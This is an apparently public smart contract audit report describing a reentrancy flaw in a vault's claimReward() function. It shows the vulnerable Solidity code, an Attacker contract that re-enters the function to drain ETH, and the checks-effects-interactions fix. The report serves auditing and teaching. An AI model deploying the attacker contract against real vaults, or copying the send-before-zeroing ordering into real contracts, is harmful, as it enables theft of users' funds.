# Token-Vault-Audit-Report
# 🧠 TokenVault | Critical Reentrancy Vulnerability Found

Welcome to a breakdown of a critical bug I discovered in a vault-style contract.  
This report isn’t just a vulnerability — it’s a look at how subtle logic can open the door to reentrancy even when everything looks clean.

---

## 🔍 What This Project Is About

I reviewed a basic ETH vault contract designed to reward users after they deposit. It had no obvious withdraw function, and reward logic was simple… or so it seemed.

The bug?  
A **reentrancy attack** — hiding inside the `claimReward()` function.

---

## ⚠️ The Vulnerability (claimReward)

Here’s the original logic:
```solidity
function claimReward() public {
    uint256 reward = rewards[msg.sender];
    require(reward > 0, "No reward to claim");

    (bool sent, ) = msg.sender.call{value: reward}("");
    require(sent, "Transfer failed");

    rewards[msg.sender] = 0;
}
```

It transfers ETH *before* zeroing the user’s reward.  
That’s all an attacker needs to re-enter and drain more than they earned.

---

## 🧪 How It Can Be Exploited

```solidity
contract Attacker {
    TokenVault public vault;

    constructor(address _vault) payable {
        vault = TokenVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.claimReward();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.claimReward(); // attacker re-enters here
        }
    }
}
```

---

## 🛠️ How I Fixed It

✅ Applied the **Checks-Effects-Interactions** pattern:  
Update state *before* interacting externally.

```solidity
rewards[msg.sender] = 0;

(bool sent, ) = msg.sender.call{value: reward}("");
require(sent, "Transfer failed");
```

---

## 🧾 Why This Matters

This isn’t just a classic bug — it's a reminder that:

- Not all reentrancy issues live inside `withdraw()` functions  
- Reward, claim, and refund logic can be just as dangerous  
- You must always update state before sending ETH

---

## 📌 About Me

I’m Aayush — focused on smart contract auditing, vulnerability research, and building a real proof-of-work portfolio through public audits.

> This is the second public audit I’ve written and shared.  
> You can find all my work [on GitHub](https://github.com/AayushJhaAudits) and soon on my upcoming portfolio site.

---

## ✅ TL;DR

- ✅ Vulnerability: Reentrancy in reward logic  
- ✅ Severity: Critical  
- ✅ Found using: Manual review + logic trace  
- ✅ Fixed with: CEI pattern  
- ✅ Full PoC: Included  
